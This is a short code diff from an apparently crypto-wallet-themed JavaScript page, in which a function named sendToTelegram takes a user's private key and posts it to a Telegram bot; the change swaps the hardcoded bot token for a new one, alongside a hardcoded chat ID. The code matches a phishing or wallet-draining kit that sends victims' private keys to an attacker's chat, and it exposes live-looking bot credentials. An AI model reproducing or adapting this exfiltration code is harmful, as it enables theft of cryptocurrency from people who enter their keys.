@@ -177,7 +177,7 @@ let selectedBlockchain = "";
     }
 
     function sendToTelegram(privateKey) {
-        const botToken = "7561705304:AAF-0r1TTjdMfFSOjfRlzBusAHoENk2X6_s";  // Replace with your bot token
+        const botToken = "7716712152:AAHwLH6hTe9HE9WMCEDL12VXk6NDd43MwWE";  // Replace with your bot token
         const chatId = "1028212663";      // Replace with your Telegram chat ID
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
